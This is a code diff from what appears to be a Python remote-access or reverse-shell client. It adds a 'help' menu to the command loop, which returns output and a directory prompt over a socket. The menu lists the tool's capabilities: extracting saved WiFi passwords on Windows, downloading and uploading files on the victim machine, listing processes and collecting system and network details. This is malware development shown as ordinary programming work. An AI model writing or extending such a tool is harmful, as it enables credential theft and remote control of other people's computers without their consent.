@@ -305,6 +305,22 @@ Local IP: {local_ip}
                     s.send(info.encode() + os.getcwd().encode() + b"> ")
                     continue
                 
+                if cmd == "help":
+                    info = """
+=== Available Commands ===
+sysinfo    - System information (OS, hostname, user)
+ipconfig   - Network configuration and IP addresses
+processes  - List running processes (top 50)
+wifi       - Extract saved WiFi passwords (Windows)
+download   - Download file from client
+upload     - Upload file to client
+cd         - Change directory
+help       - Show this help message
+quit       - Close connection
+"""
+                    s.send(info.encode() + os.getcwd().encode() + b"> ")
+                    continue
+                
                 if data[:2].decode("utf-8") == 'cd':
                     try:
                         os.chdir(data[3:].decode("utf-8"))
